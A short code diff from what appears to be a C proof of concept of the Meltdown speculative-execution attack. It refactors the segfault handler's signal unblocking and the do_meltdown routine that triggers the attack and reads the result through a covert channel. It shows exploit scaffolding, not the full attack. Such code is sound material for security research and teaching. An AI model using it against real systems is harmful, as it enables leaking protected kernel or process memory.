@@ -68,10 +68,10 @@ static void flush_buf(){
 
 static void segfault_handler(int signum) {
     printf("handled segfault\n");
-    sigset_t sigs;
-    sigemptyset(&sigs);
-    sigaddset(&sigs, signum);
-    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+    // sigset_t sigs;
+    // sigemptyset(&sigs);
+    // sigaddset(&sigs, signum);
+    // sigprocmask(SIG_UNBLOCK, &sigs, NULL);
     siglongjmp(sig_buf, 1); 
 }
 
@@ -152,12 +152,10 @@ static int do_meltdown(uintptr_t adrs) {
     if (sigsetjmp(sig_buf, 1) == 0) {
     // call meltdown
         meltdown(adrs);
-        
-        ret = cc_receive(); // receive anyways
-    }else{
-        ret = cc_receive(); // receive if segfault
     }
-    return ret;
+
+    
+    return cc_receive();
 }
 
 #ifdef MELTDOWNCASE
